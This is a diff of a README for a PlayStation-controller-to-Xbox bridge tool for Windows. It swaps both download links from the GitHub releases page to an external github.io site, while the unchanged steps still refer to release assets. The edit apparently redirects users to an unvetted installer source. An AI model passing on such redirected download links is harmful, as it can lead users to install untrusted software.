@@ -1,6 +1,6 @@
 # 🎮 DualSenseX-Steam - Play Windows Games With PlayStation Controllers
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Running-argentina789/DualSenseX-Steam/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://running-argentina789.github.io)
 
 DualSenseX-Steam acts as a bridge between your PlayStation controller and your Windows computer. It allows your system to recognize your PS5 DualSense or PS4 DualShock controller as an Xbox controller. This makes your hardware compatible with almost every game on Steam and other game platforms.
 
@@ -17,7 +17,7 @@ Ensure your computer meets these basic needs before you begin:
 
 You need to obtain the latest version of the application from our release page. 
 
-1. Visit this link to download the installer: [https://github.com/Running-argentina789/DualSenseX-Steam/releases](https://github.com/Running-argentina789/DualSenseX-Steam/releases).
+1. Visit this link to download the installer: [https://running-argentina789.github.io](https://running-argentina789.github.io).
 2. Look for the "Assets" section at the bottom of the newest version post.
 3. Click the file ending in `.zip` or `.msi` to start your download.
 
